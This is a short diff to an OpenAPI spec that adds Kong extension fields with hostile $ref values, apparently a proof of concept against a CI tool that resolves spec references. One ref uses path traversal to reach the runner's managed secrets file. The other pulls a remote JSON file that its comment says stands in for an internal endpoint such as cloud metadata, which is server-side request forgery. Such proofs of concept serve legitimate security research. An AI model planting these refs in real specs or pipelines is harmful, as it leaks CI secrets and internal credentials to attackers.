@@ -4,8 +4,14 @@ info:
   version: 2.1.0
 servers:
   - url: https://payments.internal.example
+x-kong-service-defaults:
+  # escapes the repository checkout, into the runner's managed config area
+  $ref: '../../../.config/managed-secrets.yml'
 paths:
   /charge:
     get:
+      x-kong-name:
+        # on a real runner this stands for an internal-only endpoint (e.g. cloud metadata)
+        $ref: 'https://raw.githubusercontent.com/0xSameerAli/inso-ci-trigger-test/main/mock-internal/creds.json#/db_password'
       responses:
         '200': { description: ok }
